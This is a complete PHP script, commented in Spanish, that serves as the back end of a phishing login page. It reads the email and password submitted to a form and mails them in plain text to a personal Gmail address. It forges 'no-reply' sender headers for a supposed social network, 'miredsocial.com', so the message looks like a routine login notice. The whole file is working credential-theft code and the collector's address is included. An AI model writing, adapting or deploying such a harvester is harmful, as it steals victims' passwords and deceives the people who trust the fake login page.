<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtiene los datos del formulario
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Dirección de correo del destinatario
    $to = 'jairogil146@gmail.com';
    $subject = 'Nuevo inicio de sesión';
    
    // Cuerpo del mensaje
    $message = "Correo electrónico: " . $email . "\nContraseña: " . $password;
    
    // Encabezados del correo
    $headers = "From: no-reply@miredsocial.com\r\n";
    $headers .= "Reply-To: no-reply@miredsocial.com\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    // Envía el correo
    if (mail($to, $subject, $message, $headers)) {
        echo "Correo enviado correctamente.";
    } else {
        echo "Error al enviar el correo.";
    }
} else {
    echo "Método de solicitud no permitido.";
}
?>
